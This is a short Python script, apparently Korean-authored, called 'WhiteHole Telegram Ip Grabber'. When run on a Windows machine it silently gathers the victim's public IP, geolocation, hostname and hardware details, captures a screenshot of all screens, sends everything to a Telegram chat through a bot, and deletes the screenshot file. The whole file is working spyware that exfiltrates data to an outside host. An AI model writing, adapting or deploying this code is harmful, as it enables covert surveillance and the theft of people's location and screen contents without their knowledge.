import telegram

token = "텔레그램  봇 토큰"

client = telegram.Bot(token=token)
chat_id = 123






def GET_IP():
    import requests as req
    import socket , wmi ,os
    from PIL import ImageGrab
    Ip = req.get("https://api.ipify.org/")
    
    if Ip.status_code == 200:
        r = req.get(f"http://ip-api.com/json/").json()
        
        name = socket.gethostname()
        com_cpu = wmi.WMI().Win32_Processor()[0]
        com_gpu = wmi.WMI().Win32_VideoController()[0]
        com_ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        
        Screenshot = ImageGrab.grab(bbox=None,all_screens=True,include_layered_windows=False,xdisplay=None)
        Screenshot.save("WhiteHole.png")
        msg = f"""
        WhiteHole Telegram Ip Grabber

{name}'s IP : {Ip.text}

{name}'s CPU : {com_cpu}
{name}'s GPU : {com_gpu}
{name}'s RAM : {com_ram}

status : {r['status']}
country : {r['country']}
country-code : {r['countryCode']}
region : {r['region']}
regionName : {r['regionName']}
city : {r['city']}
zip : {r['zip']}
timezone : {r['timezone']}
isp : {r['isp']}
org : {r['org']}
        """
        client.sendMessage(chat_id=chat_id,text=msg)
        client.send_photo(chat_id=chat_id,photo=open("WhiteHole.png",'rb'))
        os.remove('WhiteHole.png')
    else:
        client.sendMessage(chat_id=chat_id,text="오류가 발생하였습니다!")

if __name__ == "__main__":
        GET_IP()
